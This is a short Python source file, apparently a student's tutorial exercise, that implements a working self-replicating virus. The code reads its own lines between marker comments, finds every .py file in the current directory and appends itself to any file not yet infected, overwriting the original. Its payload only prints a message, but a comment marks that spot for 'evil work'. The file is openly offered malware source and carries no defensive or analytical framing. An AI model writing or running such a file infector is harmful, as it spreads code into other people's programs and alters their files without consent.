# virus in python
# McKenna Branting
# walked through code with Shad Sluiter video:

import glob
import re
import sys

# put copy of all these lines into a list
virusCode = []

# open the file and read all lines
# filter out all lines that are not inside the virus code boundary

thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()

# save all lines into a list to use later
inVirus = False
for line in lines:
    if re.search("^# virus in python", line):
        inVirus = True

        # if virus code has been found start appending
        # lines to virusCode list.
        # Assume that virus code is always appended to end
    if inVirus == True:
        virusCode.append(line)

    if re.search("^# end of virus code", line):
        break

# find potential victims

programs = glob.glob("*.py")

# check and infect all programs that glob found
for p in programs:
    file = open(p, "r")
    programCode = file.readlines()
    file.close()

    # check to see if file is infected already
    infected = False
    for line in programCode:
        if re.search("^# virus in python", line):
            infected = True
            break
        # stop we dont need to try to infect program again

    if not infected:
        newCode = []
        # new version = current + virus code
        newCode = programCode
        newCode.extend(virusCode)

        # write the new version to the file. Overwrite to original
        file = open(p, "w")
        file.writelines(newCode)
        file.close()

# payload - do your evil work here
print("this file is infected")

# end of virus code
